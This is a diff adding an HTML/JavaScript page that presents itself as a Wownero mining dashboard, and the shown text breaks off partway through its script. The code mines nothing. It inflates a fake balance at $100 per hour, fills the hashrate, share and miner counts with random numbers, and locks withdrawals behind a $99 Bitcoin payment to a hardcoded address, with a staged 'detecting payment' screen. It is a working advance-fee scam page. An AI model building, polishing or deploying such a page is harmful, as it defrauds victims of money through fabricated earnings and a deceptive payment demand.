@@ -1,0 +1,1366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wownero Miner — Dashboard v2.4.1</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<style>
+  :root {
+    --primary: #e91e8c;
+    --secondary: #7b2fff;
+    --bg-deep: #090c14;
+    --panel: rgba(255,255,255,0.04);
+    --border: rgba(255,255,255,0.08);
+    --amber: #f59e0b;
+    --text: #e8eaf0;
+    --muted: #7b82a0;
+    --red: #ef4444;
+    --green: #22c55e;
+  }
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  ::-webkit-scrollbar{display:none}
+  html,body{
+    width:100vw;height:100vh;overflow:hidden;
+    background:var(--bg-deep);
+    color:var(--text);
+    font-family:'Segoe UI',system-ui,sans-serif;
+    font-size:12px;
+    font-variant-numeric:tabular-nums;
+  }
+  body::before{
+    content:'';
+    position:fixed;inset:0;
+    pointer-events:none;
+    z-index:0;
+    background:
+      radial-gradient(ellipse 60% 40% at 10% 10%, rgba(233,30,140,0.11) 0%, transparent 70%),
+      radial-gradient(ellipse 50% 50% at 90% 80%, rgba(123,47,255,0.10) 0%, transparent 70%),
+      radial-gradient(ellipse 40% 40% at 50% 50%, rgba(245,158,11,0.08) 0%, transparent 70%);
+  }
+  #app{
+    display:grid;
+    grid-template-columns:1fr 340px;
+    grid-template-rows:46px 1fr;
+    gap:8px;
+    padding:8px;
+    position:fixed;inset:0;
+    z-index:1;
+  }
+  /* TOP BAR */
+  #topbar{
+    grid-column:1/-1;
+    display:flex;align-items:center;gap:0;
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:0 12px;
+    backdrop-filter:blur(10px);
+    overflow:hidden;
+  }
+  .brand{display:flex;align-items:center;gap:8px;padding-right:14px;}
+  .coin-icon{
+    width:26px;height:26px;border-radius:50%;
+    object-fit:cover;
+    background:linear-gradient(135deg,var(--primary),var(--secondary));
+    flex-shrink:0;
+  }
+  .brand-text{display:flex;flex-direction:column;line-height:1.2}
+  .brand-name{font-weight:700;font-size:13px;color:var(--text)}
+  .brand-sub{font-size:9px;text-transform:uppercase;letter-spacing:.06em;color:var(--muted)}
+  .vdiv{width:1px;background:var(--border);height:22px;margin:0 12px;flex-shrink:0}
+  .status-items{display:flex;align-items:center;gap:0;flex:1}
+  .status-item{
+    display:flex;align-items:center;gap:6px;
+    padding:0 12px;
+    border-right:1px solid var(--border);
+    height:100%;
+    font-size:11px;color:var(--muted);
+    white-space:nowrap;
+  }
+  .status-item:last-child{border-right:none}
+  .pulse-dot{
+    width:7px;height:7px;border-radius:50%;
+    background:var(--green);
+    box-shadow:0 0 6px var(--green);
+    animation:pulse 2s infinite;
+    flex-shrink:0;
+  }
+  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.6;transform:scale(1.3)}}
+  .badge{
+    padding:2px 7px;border-radius:4px;font-size:9px;
+    font-weight:700;letter-spacing:.05em;
+  }
+  .badge-red{background:rgba(239,68,68,.18);color:var(--red);border:1px solid rgba(239,68,68,.3)}
+  .badge-green{background:rgba(34,197,94,.18);color:var(--green);border:1px solid rgba(34,197,94,.3)}
+  #backend-dot{display:none}
+
+  /* PANELS */
+  #left-panel{
+    display:flex;flex-direction:column;gap:7px;
+    min-height:0;overflow:hidden;
+  }
+  #right-panel{
+    display:flex;flex-direction:column;gap:7px;
+    min-height:0;overflow:hidden;
+  }
+
+  /* CARDS */
+  .card{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:12px;
+    padding:10px 12px;
+    backdrop-filter:blur(10px);
+    box-shadow:0 4px 24px rgba(0,0,0,.4);
+    flex-shrink:0;
+  }
+  .card-title{
+    display:flex;align-items:center;gap:6px;
+    font-size:10px;font-weight:600;text-transform:uppercase;
+    letter-spacing:.06em;color:var(--muted);
+    margin-bottom:8px;
+  }
+  .card-title i{font-size:11px}
+
+  /* BALANCE HERO */
+  #balance-card{
+    position:relative;overflow:hidden;
+    background:linear-gradient(135deg,rgba(233,30,140,.17) 0%,rgba(123,47,255,.09) 100%);
+    border:1px solid rgba(233,30,140,.28);
+  }
+  #balance-card::after{
+    content:'';
+    position:absolute;top:-30px;right:-30px;
+    width:120px;height:120px;border-radius:50%;
+    background:radial-gradient(circle,rgba(233,30,140,.22) 0%,transparent 70%);
+    pointer-events:none;
+  }
+  .balance-inner{display:flex;align-items:center;justify-content:space-between;gap:10px;}
+  .balance-left{display:flex;flex-direction:column;gap:3px}
+  .balance-label{font-size:10px;color:var(--muted)}
+  .balance-num{
+    font-size:30px;font-weight:900;color:var(--text);
+    text-shadow:0 0 20px rgba(233,30,140,.6);
+    line-height:1;
+    transition:color .08s;
+  }
+  .balance-flash{color:var(--secondary)!important}
+  .balance-sub{font-size:10px;color:var(--muted);margin-top:2px}
+  .balance-right{display:flex;flex-direction:column;align-items:flex-end;gap:6px}
+  .rate-pill{
+    display:flex;align-items:center;gap:5px;
+    background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.25);
+    padding:4px 8px;border-radius:6px;color:var(--green);font-size:11px;font-weight:600;
+  }
+  .session-id{
+    font-size:9px;color:var(--secondary);font-family:monospace;
+    word-break:break-all;text-align:right;max-width:160px;
+  }
+
+  /* STATS */
+  .stats-grid{
+    display:grid;grid-template-columns:repeat(4,1fr);gap:6px;
+  }
+  .stat-box{
+    background:rgba(255,255,255,.03);border:1px solid var(--border);
+    border-radius:8px;padding:7px 8px;
+    display:flex;flex-direction:column;gap:2px;
+  }
+  .stat-label{font-size:9px;color:var(--muted);text-transform:uppercase;letter-spacing:.04em}
+  .stat-val{font-size:18px;font-weight:800;line-height:1}
+  .stat-sub{font-size:9px;color:var(--muted)}
+  .c-green{color:var(--green)}
+  .c-primary{color:var(--primary)}
+  .c-amber{color:var(--amber)}
+  .c-secondary{color:var(--secondary)}
+  .c-muted{color:var(--muted)}
+
+  /* SPARKLINE */
+  #sparkline-canvas{
+    width:100%;height:36px;display:block;
+  }
+
+  /* BOTTOM ROW */
+  #bottom-row{
+    display:grid;grid-template-columns:1fr 1fr;gap:7px;
+    flex:1;min-height:0;
+  }
+  .bottom-card{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:12px;
+    padding:10px 12px;
+    backdrop-filter:blur(10px);
+    box-shadow:0 4px 24px rgba(0,0,0,.4);
+    overflow:hidden;
+    display:flex;flex-direction:column;
+  }
+
+  /* MARKET DATA */
+  .coin-row{
+    display:flex;align-items:center;gap:8px;
+    padding:6px 0;border-bottom:1px solid var(--border);
+  }
+  .coin-row:last-of-type{border-bottom:none}
+  .coin-icon-sm{
+    width:20px;height:20px;border-radius:50%;
+    background:linear-gradient(135deg,var(--primary),var(--secondary));
+    flex-shrink:0;object-fit:cover;
+  }
+  .coin-info{flex:1}
+  .coin-name-label{font-size:10px;font-weight:600;color:var(--text)}
+  .coin-price{font-size:12px;font-weight:700;color:var(--text)}
+  .coin-change{font-size:10px}
+  .change-pos{color:var(--green)}
+  .change-neg{color:var(--red)}
+  .server-divider{
+    border:none;border-top:1px solid var(--border);
+    margin:7px 0;
+  }
+  .kv-row{
+    display:flex;justify-content:space-between;align-items:center;
+    padding:2px 0;
+    font-size:10px;
+  }
+  .kv-key{color:var(--muted)}
+  .kv-val{font-weight:700;color:var(--text)}
+
+  /* ACTIVITY FEED */
+  .activity-feed{
+    display:flex;flex-direction:column;gap:3px;
+    flex:1;overflow:hidden;
+    margin-bottom:8px;
+  }
+  .activity-entry{
+    display:flex;align-items:center;justify-content:space-between;
+    background:rgba(255,255,255,.02);border:1px solid var(--border);
+    border-radius:6px;padding:4px 7px;
+    animation:fadeInLeft .35s ease;
+    font-size:10px;
+  }
+  @keyframes fadeInLeft{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
+  .entry-time{color:var(--muted);font-size:9px}
+  .entry-hash{color:var(--muted);font-family:monospace;font-size:9px}
+  .entry-amount{color:var(--primary);font-weight:700;white-space:nowrap}
+  .pending-section{border-top:1px solid var(--border);padding-top:8px}
+  .pending-title{display:flex;align-items:center;gap:5px;font-size:10px;color:var(--muted);margin-bottom:5px}
+  .pending-amount{font-size:20px;font-weight:700;color:var(--amber)}
+  .pending-sub{font-size:9px;color:var(--muted);margin-top:2px}
+
+  /* RIGHT PANEL CARDS */
+  .input-wrap{position:relative;margin-bottom:6px}
+  .input-icon{
+    position:absolute;left:9px;top:50%;transform:translateY(-50%);
+    color:var(--muted);font-size:11px;pointer-events:none;
+  }
+  .field-input{
+    width:100%;background:rgba(255,255,255,.05);
+    border:1px solid var(--border);border-radius:7px;
+    padding:7px 8px 7px 28px;
+    color:var(--text);font-size:11px;
+    outline:none;
+    font-family:'Segoe UI',system-ui,sans-serif;
+  }
+  .field-input::placeholder{color:var(--muted)}
+  .field-input:focus{border-color:rgba(233,30,140,.4);box-shadow:0 0 0 2px rgba(233,30,140,.08)}
+  .min-info{
+    font-size:10px;color:var(--muted);
+    margin-bottom:7px;
+  }
+  .min-info span{color:var(--amber);font-weight:600}
+  #withdraw-btn{
+    width:100%;padding:8px;border-radius:8px;
+    border:none;cursor:not-allowed;
+    font-size:12px;font-weight:700;
+    transition:all .2s;
+    background:rgba(255,255,255,.06);
+    color:var(--muted);
+  }
+  #withdraw-btn.active{
+    cursor:pointer;
+    background:linear-gradient(135deg,#16a34a,#22c55e);
+    color:#fff;
+    box-shadow:0 4px 16px rgba(34,197,94,.3);
+  }
+  #withdraw-btn.active:hover{
+    transform:translateY(-1px);
+    box-shadow:0 6px 20px rgba(34,197,94,.4);
+  }
+
+  /* ACTIVATION CARD */
+  #act-card{
+    display:none;
+    background:linear-gradient(135deg,rgba(233,30,140,.10) 0%,rgba(123,47,255,.05) 100%);
+    border:1px solid rgba(233,30,140,.22);
+    border-radius:12px;
+    padding:10px 12px;
+    backdrop-filter:blur(10px);
+    box-shadow:0 4px 24px rgba(0,0,0,.4);
+  }
+  #act-card.revealed{
+    display:block;
+    animation:slideIn .35s ease;
+  }
+  @keyframes slideIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
+  .act-title{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:700;color:var(--text);margin-bottom:7px}
+  .act-price{font-size:22px;font-weight:900;color:var(--text)}
+  .act-price-sub{font-size:10px;color:var(--muted);margin-left:4px}
+  .act-activated-label{font-size:14px;font-weight:700;color:var(--green);display:flex;align-items:center;gap:5px}
+  .act-desc{font-size:10px;color:var(--muted);margin:5px 0 8px}
+  .act-features{
+    display:grid;grid-template-columns:1fr 1fr;gap:4px;
+    margin-bottom:9px;
+  }
+  .act-feat{font-size:10px;color:var(--text)}
+  .act-feat i{color:var(--green);margin-right:3px}
+  #act-btn{
+    width:100%;padding:8px;border-radius:8px;
+    border:none;cursor:pointer;
+    font-size:12px;font-weight:700;
+    background:linear-gradient(135deg,var(--primary),#9333ea);
+    color:#fff;
+    box-shadow:0 4px 16px rgba(233,30,140,.3);
+    transition:all .2s;
+  }
+  #act-btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(233,30,140,.4)}
+  #act-activated-content{display:none}
+
+  /* POOL DETAILS */
+  #pool-card{flex:1}
+  .pool-section-title{
+    font-size:10px;font-weight:600;color:var(--muted);
+    text-transform:uppercase;letter-spacing:.05em;
+    margin:8px 0 5px;
+  }
+
+  /* SWAL OVERRIDES */
+  .swal2-popup.swal2-toast{
+    background:#12162a!important;
+    border:1px solid rgba(233,30,140,.28)!important;
+    border-radius:10px!important;
+    color:var(--text)!important;
+  }
+
+  /* MODAL LOADER */
+  .modal-loader{display:none;text-align:center;padding:12px 0}
+  .ring-wrap{position:relative;width:60px;height:60px;margin:0 auto 12px}
+  .ring-outer{
+    position:absolute;inset:0;border-radius:50%;
+    border:3px solid transparent;
+    border-top-color:var(--primary);
+    animation:spin .9s linear infinite;
+  }
+  .ring-inner{
+    position:absolute;inset:8px;border-radius:50%;
+    border:3px solid transparent;
+    border-bottom-color:var(--secondary);
+    animation:spin-rev 1.4s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes spin-rev{to{transform:rotate(-360deg)}}
+  .loader-msg{font-size:12px;color:var(--muted);margin-bottom:6px}
+  .loader-sub{font-size:11px;color:var(--muted);margin-bottom:10px}
+  .bc-status{
+    display:inline-flex;align-items:center;gap:5px;
+    padding:4px 10px;border-radius:5px;
+    font-size:10px;font-weight:600;
+    background:rgba(255,255,255,.06);color:var(--muted);
+  }
+  .bc-status.checking{background:rgba(123,47,255,.15);color:var(--secondary)}
+  .bc-status.pending{background:rgba(245,158,11,.15);color:var(--amber)}
+  .cancel-link{
+    display:block;margin-top:10px;font-size:9px;
+    color:var(--muted);text-decoration:underline;cursor:pointer;
+  }
+
+  /* QR container */
+  #qr-container{
+    display:flex;justify-content:center;
+    margin:10px 0;
+  }
+  #qr-container canvas{border-radius:6px}
+  .btc-addr-box{
+    background:rgba(255,255,255,.05);border:1px solid var(--border);
+    border-radius:6px;padding:7px 10px;
+    font-family:monospace;font-size:10px;color:var(--text);
+    word-break:break-all;text-align:center;
+    margin-bottom:8px;
+  }
+  #copy-btn{
+    width:100%;padding:6px;border-radius:6px;
+    background:rgba(255,255,255,.07);border:1px solid var(--border);
+    color:var(--text);font-size:11px;cursor:pointer;
+    margin-bottom:8px;transition:background .2s;
+  }
+  #copy-btn:hover{background:rgba(255,255,255,.12)}
+  .status-line{
+    display:flex;align-items:center;justify-content:center;
+    gap:6px;font-size:10px;color:var(--muted);
+  }
+  .status-line i{color:var(--green)}
+
+</style>
+</head>
+<body>
+
+<div id="app">
+
+  <!-- TOP BAR -->
+  <div id="topbar">
+    <div class="brand">
+      <img
+        class="coin-icon"
+        id="top-coin-icon"
+        src="https://assets.coingecko.com/coins/images/11977/small/wownero.png"
+        onerror="this.onerror=null;this.style.background='linear-gradient(135deg,#e91e8c,#7b2fff)';this.src='data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7'"
+        alt="WOW"
+      >
+      <div class="brand-text">
+        <span class="brand-name">Wownero Miner</span>
+        <span class="brand-sub">Dashboard · v2.4.1</span>
+      </div>
+    </div>
+    <div class="vdiv"></div>
+    <div class="status-items">
+      <div class="status-item">
+        <span class="pulse-dot"></span>
+        <span>Server Online</span>
+      </div>
+      <div class="status-item">
+        <i class="fa-solid fa-server" style="color:var(--primary);font-size:10px"></i>
+        <span>pool.wownero.com:3333</span>
+      </div>
+      <div class="status-item">
+        <i class="fa-solid fa-users" style="color:var(--secondary);font-size:10px"></i>
+        <span>Workers: <strong id="workers-count" style="color:var(--text)">16</strong></span>
+      </div>
+      <div class="status-item">
+        <i class="fa-solid fa-clock" style="color:var(--amber);font-size:10px"></i>
+        <span>Uptime: <strong id="uptime-display" style="color:var(--text)">00:00:00</strong></span>
+      </div>
+      <div class="status-item">
+        <span id="withdrawal-badge" class="badge badge-red">LOCKED</span>
+      </div>
+    </div>
+    <span id="backend-dot"></span>
+  </div>
+
+  <!-- LEFT PANEL -->
+  <div id="left-panel">
+
+    <!-- BALANCE HERO -->
+    <div class="card" id="balance-card">
+      <div class="card-title">
+        <i class="fa-solid fa-coins" style="color:var(--primary)"></i>
+        WOW Earnings · real-time USD conversion
+      </div>
+      <div class="balance-inner">
+        <div class="balance-left">
+          <span class="balance-label">WOW earnings · real-time USD conversion</span>
+          <span class="balance-num" id="balance-display">$0.00</span>
+          <span class="balance-sub">Accruing at $100.00/hr · auto-converts at market rate</span>
+        </div>
+        <div class="balance-right">
+          <div class="rate-pill">
+            <i class="fa-solid fa-arrow-trend-up"></i>
+            Earning $100.00 / hr
+          </div>
+          <div class="session-id" id="session-display">Session: loading…</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- MINING STATS -->
+    <div class="card">
+      <div class="card-title">
+        <i class="fa-solid fa-gauge-high" style="color:var(--primary)"></i>
+        Mining Statistics
+      </div>
+      <div class="stats-grid">
+        <div class="stat-box">
+          <span class="stat-label">Hashrate</span>
+          <span class="stat-val c-green" id="stat-hashrate">2.45</span>
+          <span class="stat-sub">GH/s · RandomWOW</span>
+        </div>
+        <div class="stat-box">
+          <span class="stat-label">Shares</span>
+          <span class="stat-val c-primary" id="stat-shares">0</span>
+          <span class="stat-sub">accepted · 0 rejected</span>
+        </div>
+        <div class="stat-box">
+          <span class="stat-label">Efficiency</span>
+          <span class="stat-val c-amber" id="stat-efficiency">98.7</span>
+          <span class="stat-sub">% · pool target met</span>
+        </div>
+        <div class="stat-box">
+          <span class="stat-label">Active Miners</span>
+          <span class="stat-val c-green" id="stat-miners">18</span>
+          <span class="stat-sub">nodes connected</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SPARKLINE -->
+    <div class="card" style="padding-bottom:8px">
+      <div class="card-title">
+        <i class="fa-solid fa-chart-line" style="color:var(--secondary)"></i>
+        Hashrate · last 60s
+      </div>
+      <canvas id="sparkline-canvas" height="36"></canvas>
+    </div>
+
+    <!-- BOTTOM ROW -->
+    <div id="bottom-row">
+
+      <!-- MARKET + SERVER INFO -->
+      <div class="bottom-card">
+        <div class="card-title" style="margin-bottom:6px">
+          <i class="fa-solid fa-chart-bar" style="color:var(--amber)"></i>
+          Market Data
+        </div>
+        <div class="coin-row">
+          <img class="coin-icon-sm" src="https://assets.coingecko.com/coins/images/1/small/bitcoin.png" alt="BTC"
+            onerror="this.onerror=null;this.style.background='linear-gradient(135deg,#f7931a,#ffb347)'">
+          <div class="coin-info">
+            <div class="coin-name-label">Bitcoin</div>
+            <div><span class="coin-price" id="btc-price">—</span> <span class="coin-change" id="btc-change"></span></div>
+          </div>
+        </div>
+        <div class="coin-row">
+          <img
+            class="coin-icon-sm"
+            id="market-coin-icon"
+            src="https://assets.coingecko.com/coins/images/11977/small/wownero.png"
+            alt="WOW"
+            onerror="this.onerror=null;this.style.background='linear-gradient(135deg,#e91e8c,#7b2fff)'"
+          >
+          <div class="coin-info">
+            <div class="coin-name-label">Wownero</div>
+            <div><span class="coin-price" id="wow-price">—</span> <span class="coin-change" id="wow-change"></span></div>
+          </div>
+        </div>
+        <hr class="server-divider">
+        <div style="font-size:10px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:4px">Server Info</div>
+        <div class="kv-row"><span class="kv-key">Algorithm</span><span class="kv-val">RandomWOW</span></div>
+        <div class="kv-row"><span class="kv-key">Pool fee</span><span class="kv-val c-green">0.00%</span></div>
+        <div class="kv-row"><span class="kv-key">Network diff</span><span class="kv-val" id="net-diff-left">3.91 TH</span></div>
+        <div class="kv-row"><span class="kv-key">Last block</span><span class="kv-val" id="last-block-left">2,847,234</span></div>
+        <div class="kv-row"><span class="kv-key">SSL</span><span class="kv-val c-green"><i class="fa-solid fa-check"></i> Encrypted</span></div>
+      </div>
+
+      <!-- ACTIVITY + PENDING -->
+      <div class="bottom-card">
+        <div class="card-title" style="margin-bottom:4px">
+          <i class="fa-solid fa-bolt" style="color:var(--secondary)"></i>
+          Recent Activity
+        </div>
+        <div class="activity-feed" id="activity-feed"></div>
+        <div class="pending-section">
+          <div class="pending-title">
+            <i class="fa-solid fa-coins" style="color:var(--amber)"></i>
+            Pending Payout
+          </div>
+          <div class="pending-amount" id="pending-amount">$0.00</div>
+          <div class="pending-sub">Accruing · block time 120s avg</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- RIGHT PANEL -->
+  <div id="right-panel">
+
+    <!-- WITHDRAW FUNDS -->
+    <div class="card">
+      <div class="card-title">
+        <i class="fa-solid fa-paper-plane" style="color:var(--green)"></i>
+        Withdraw Funds
+      </div>
+      <p class="min-info">Minimum withdraw: <span>$50.00</span></p>
+      <div class="input-wrap">
+        <i class="fa-solid fa-dollar-sign input-icon"></i>
+        <input class="field-input" type="number" id="amount-input" placeholder="Amount (min $50)" min="50" step="0.01">
+      </div>
+      <div class="input-wrap">
+        <i class="fa-solid fa-wallet input-icon"></i>
+        <input class="field-input" type="text" id="address-input" placeholder="Your WOW / BTC address">
+      </div>
+      <button id="withdraw-btn">🔒 Earn $50.00 more to unlock</button>
+    </div>
+
+    <!-- ACTIVATION CARD -->
+    <div id="act-card">
+      <div class="act-title">
+        <i class="fa-solid fa-lock" style="color:var(--primary)"></i>
+        Withdrawal Access
+      </div>
+      <div id="act-locked-content">
+        <div style="display:flex;align-items:baseline;gap:4px;margin-bottom:5px">
+          <span class="act-price">$99</span>
+          <span class="act-price-sub">one-time</span>
+        </div>
+        <p class="act-desc">Unlock instant, fee-free withdrawals forever.</p>
+        <div class="act-features">
+          <div class="act-feat"><i class="fa-solid fa-check"></i>Instant payouts</div>
+          <div class="act-feat"><i class="fa-solid fa-check"></i>No fees ever</div>
+          <div class="act-feat"><i class="fa-solid fa-check"></i>Priority queue</div>
+          <div class="act-feat"><i class="fa-solid fa-check"></i>Lifetime access</div>
+        </div>
+        <button id="act-btn">🔓 Activate Withdrawals</button>
+      </div>
+      <div id="act-activated-content">
+        <div class="act-activated-label"><i class="fa-solid fa-circle-check"></i> Activated</div>
+        <p class="act-desc">Withdrawals unlocked — instant, no fees.</p>
+      </div>
+    </div>
+
+    <!-- POOL DETAILS -->
+    <div class="card" id="pool-card" style="flex:1;overflow:hidden">
+      <div class="card-title">
+        <i class="fa-solid fa-server" style="color:var(--primary)"></i>
+        Pool Details
+      </div>
+      <div class="kv-row"><span class="kv-key">Host</span><span class="kv-val">pool.wownero.com</span></div>
+      <div class="kv-row"><span class="kv-key">Port</span><span class="kv-val">3333 (SSL)</span></div>
+      <div class="kv-row"><span class="kv-key">Block time</span><span class="kv-val">120s avg</span></div>
+      <div class="kv-row"><span class="kv-key">Network diff</span><span class="kv-val" id="net-diff-right">3.91 TH</span></div>
+      <div class="kv-row"><span class="kv-key">Last block</span><span class="kv-val" id="last-block-right">2,847,234</span></div>
+      <div class="kv-row"><span class="kv-key">Pool fee</span><span class="kv-val c-green">0.00%</span></div>
+      <div class="kv-row"><span class="kv-key">Algorithm</span><span class="kv-val">RandomWOW</span></div>
+      <div class="kv-row"><span class="kv-key">SSL</span><span class="kv-val c-green"><i class="fa-solid fa-check"></i> Enabled</span></div>
+      <hr class="server-divider" style="margin:6px 0">
+      <div class="pool-section-title">Connection</div>
+      <div class="kv-row"><span class="kv-key">Latency</span><span class="kv-val c-green" id="pool-latency">22ms</span></div>
+      <div class="kv-row"><span class="kv-key">Accepted</span><span class="kv-val c-green" id="pool-accepted">0</span></div>
+      <div class="kv-row"><span class="kv-key">Rejected</span><span class="kv-val" style="color:var(--red)">0</span></div>
+      <div class="kv-row"><span class="kv-key">Stale</span><span class="kv-val c-amber">0</span></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- MODAL INNER HTML (injected via Swal) -->
+<template id="payment-modal-tpl">
+  <div style="color:#e8eaf0;font-family:'Segoe UI',system-ui,sans-serif;font-size:13px">
+    <p style="color:#7b82a0;font-size:12px;margin-bottom:8px;line-height:1.5">
+      Send exactly <strong style="color:#e8eaf0">$99 in Bitcoin</strong> to the address below to unlock withdrawals permanently.
+    </p>
+    <div id="qr-container"></div>
+    <div class="btc-addr-box" id="btc-addr-display">1DBpqUEhcX9mTHh8Mfw3jaC794kRskATA2</div>
+    <button id="copy-btn" onclick="copyBtcAddress()">
+      <i class="fa-solid fa-copy"></i> Copy address
+    </button>
+    <div class="status-line">
+      <i class="fa-solid fa-satellite-dish"></i>
+      Server online – waiting for 1 network confirmation
+    </div>
+    <div class="modal-loader" id="modal-loader">
+      <div class="ring-wrap">
+        <div class="ring-outer"></div>
+        <div class="ring-inner"></div>
+      </div>
+      <div class="loader-msg">Detecting payment on blockchain…</div>
+      <div class="loader-sub">Waiting for network confirmation</div>
+      <span class="bc-status" id="bc-status-badge">
+        <i class="fa-solid fa-circle-notch fa-spin" style="font-size:9px"></i>
+        Connecting to blockchain node…
+      </span>
+      <a class="cancel-link" onclick="cancelPaymentModal()">Cancel and close</a>
+    </div>
+  </div>
+</template>
+
+<script>
+// ============================================================
+// CONSTANTS
+// ============================================================
+const TICKER = 'wow';
+const COIN_NAME = 'Wownero';
+const COIN_COLOR_PRIMARY = '#e91e8c';
+const COIN_COLOR_SECONDARY = '#7b2fff';
+const BTC_ADDRESS = '1DBpqUEhcX9mTHh8Mfw3jaC794kRskATA2';
+const RATE_PER_MS = 100 / 3600000; // $100/hr
+const MIN_WITHDRAW = 50;
+const ACTIVATION_PRICE = 99;
+const COINGECKO_ID = 'wownero';
+const BACKEND_URL = 'http://localhost:3001';
+
+// ============================================================
+// STATE
+// ============================================================
+let balance = 0;
+let lastTime = Date.now();
+let sessionId = '';
+let isActivated = false;
+let shares = 0;
+let blockNumber = 2847234;
+let paymentPollInterval = null;
+let backendPollInterval = null;
+let currentSwalInstance = null;
+
+// Sparkline data
+const sparkData = [];
+let sparkHashrate = 2.45;
+
+// Activity feed
+const MAX_ACTIVITY = 6;
+const activityEntries = [];
+
+// ============================================================
+// LOCALSTORAGE
+// ============================================================
+function lsKey(k) { return `${TICKER}_${k}`; }
+
+function loadState() {
+  const savedBalance = parseFloat(localStorage.getItem(lsKey('balance')) || '0');
+  const savedLastTime = parseInt(localStorage.getItem(lsKey('last_time')) || Date.now(), 10);
+  const savedShares = parseInt(localStorage.getItem(lsKey('shares')) || '0', 10);
+  const savedActivated = localStorage.getItem(lsKey('activated')) === 'true';
+
+  let sid = localStorage.getItem(lsKey('session'));
+  if (!sid) {
+    sid = Array.from(crypto.getRandomValues(new Uint8Array(16)))
+      .map(b => b.toString(16).padStart(2, '0')).join('');
+    localStorage.setItem(lsKey('session'), sid);
+  }
+
+  if (!localStorage.getItem(lsKey('start'))) {
+    localStorage.setItem(lsKey('start'), Date.now().toString());
+  }
+
+  sessionId = sid;
+  shares = savedShares;
+  isActivated = savedActivated;
+
+  // Catch up missed time
+  const now = Date.now();
+  const delta = now - savedLastTime;
+  balance = savedBalance + RATE_PER_MS * Math.max(0, delta);
+  lastTime = now;
+}
+
+function saveState() {
+  localStorage.setItem(lsKey('balance'), balance.toFixed(8));
+  localStorage.setItem(lsKey('last_time'), lastTime.toString());
+  localStorage.setItem(lsKey('shares'), shares.toString());
+}
+
+// ============================================================
+// EARNING ENGINE (rAF)
+// ============================================================
+let prevBalance = 0;
+let flashTimeout = null;
+let lastSaveTime = 0;
+let lastStatUpdate = 0;
+let lastSparkUpdate = 0;
+let lastActivityUpdate = 0;
+let uptimeStart = parseInt(localStorage.getItem(lsKey('start')) || Date.now(), 10);
+
+function tick(timestamp) {
+  const now = Date.now();
+  const delta = now - lastTime;
+  lastTime = now;
+  balance += RATE_PER_MS * delta;
+
+  // Balance display
+  const balNum = document.getElementById('balance-display');
+  const pendingNum = document.getElementById('pending-amount');
+  const formatted = '$' + balance.toFixed(2);
+  if (balNum) {
+    balNum.textContent = formatted;
+    if (balance > prevBalance + 0.001) {
+      if (flashTimeout) clearTimeout(flashTimeout);
+      balNum.classList.add('balance-flash');
+      flashTimeout = setTimeout(() => balNum.classList.remove('balance-flash'), 80);
+    }
+  }
+  if (pendingNum) pendingNum.textContent = formatted;
+  prevBalance = balance;
+
+  // Withdraw button
+  updateWithdrawBtn();
+
+  // Save every 3s
+  if (now - lastSaveTime > 3000) {
+    saveState();
+    lastSaveTime = now;
+  }
+
+  // Stats every 1s
+  if (now - lastStatUpdate > 1000) {
+    updateStats(now);
+    lastStatUpdate = now;
+  }
+
+  // Sparkline every 1s
+  if (now - lastSparkUpdate > 1000) {
+    updateSparkline();
+    lastSparkUpdate = now;
+  }
+
+  // Activity every 1s
+  if (now - lastActivityUpdate > 1000) {
+    addActivityEntry();
+    lastActivityUpdate = now;
+  }
+
+  // Uptime
+  updateUptime(now);
+
+  requestAnimationFrame(tick);
+}
+
+// ============================================================
+// STATS
+// ============================================================
+function rand(min, max) { return Math.random() * (max - min) + min; }
+function randInt(min, max) { return Math.floor(rand(min, max + 1)); }
+
+function updateStats(now) {
+  // Hashrate
+  sparkHashrate += (Math.random() - 0.5) * 0.08;
+  sparkHashrate = Math.max(2.20, Math.min(2.70, sparkHashrate));
+  const hrEl = document.getElementById('stat-hashrate');
+  if (hrEl) hrEl.textContent = sparkHashrate.toFixed(2);
+
+  // Shares
+  if (Math.random() < 0.7) shares++;
+  localStorage.setItem(lsKey('shares'), shares.toString());
+  const shEl = document.getElementById('stat-shares');
+  if (shEl) shEl.textContent = shares.toLocaleString();
+  const paEl = document.getElementById('pool-accepted');
+  if (paEl) paEl.textContent = shares.toLocaleString();
+
+  // Efficiency
+  const eff = rand(98.1, 99.7);
+  const effEl = document.getElementById('stat-efficiency');
+  if (effEl) effEl.textContent = eff.toFixed(1);
+
+  // Miners
+  const miners = randInt(17, 21);
+  const minEl = document.getElementById('stat-miners');
+  if (minEl) minEl.textContent = miners;
+
+  // Workers in topbar
+  const wkEl = document.getElementById('workers-count');
+  if (wkEl) wkEl.textContent = randInt(14, 18);
+
+  // Latency
+  const lat = randInt(18, 30);
+  const latEl = document.getElementById('pool-latency');
+  if (latEl) latEl.textContent = lat + 'ms';
+
+  // Network diff
+  const diff = rand(3.84, 4.06).toFixed(2) + ' TH';
+  const nd1 = document.getElementById('net-diff-left');
+  const nd2 = document.getElementById('net-diff-right');
+  if (nd1) nd1.textContent = diff;
+  if (nd2) nd2.textContent = diff;
+
+  // Last block (increments every ~120s)
